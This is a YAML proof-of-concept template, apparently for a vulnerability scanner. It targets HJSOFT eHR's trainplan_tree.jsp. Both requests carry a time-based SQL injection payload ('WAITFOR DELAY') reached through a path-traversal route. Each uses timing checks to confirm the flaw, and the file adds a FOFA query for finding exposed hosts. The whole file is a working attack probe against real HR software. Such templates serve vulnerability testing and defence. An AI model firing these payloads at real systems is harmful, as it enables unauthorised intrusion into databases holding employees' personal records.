id: poc-yaml-hjsoft-ehr-trainplan-tree-sqli
info:
  name: 宏景eHR-trainplan_tree.jsp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 宏景eHR
  fofa: app="HJSOFT-HCM"
variables:
  t1: random_int(5,9)
  t2: t1 + 2
  t3: random_int(1,4)
  t4: t3 + 2
requests:
- method: POST
  path: /templates/attestation/../../train/traincourse/trainplan_tree.jsp
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: classId=1;WAITFOR DELAY '0:0:{{.t1}}'--
  expression: "status_code == 200 && \ncontains(body,\"title=\\\"trainType\\\"\")\
    \ &&\ncontains(body,\"<?xml version\") &&\nduration >= t1 &&\nduration <= t2\n"
- method: POST
  path: /templates/attestation/../../train/traincourse/trainplan_tree.jsp
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: classId=1;WAITFOR DELAY '0:0:{{.t3}}'--
  expression: "status_code == 200 && \ncontains(body,\"title=\\\"trainType\\\"\")\
    \ &&\ncontains(body,\"<?xml version\") &&\nduration >= t3 &&\nduration <= t4\n"
transport: http
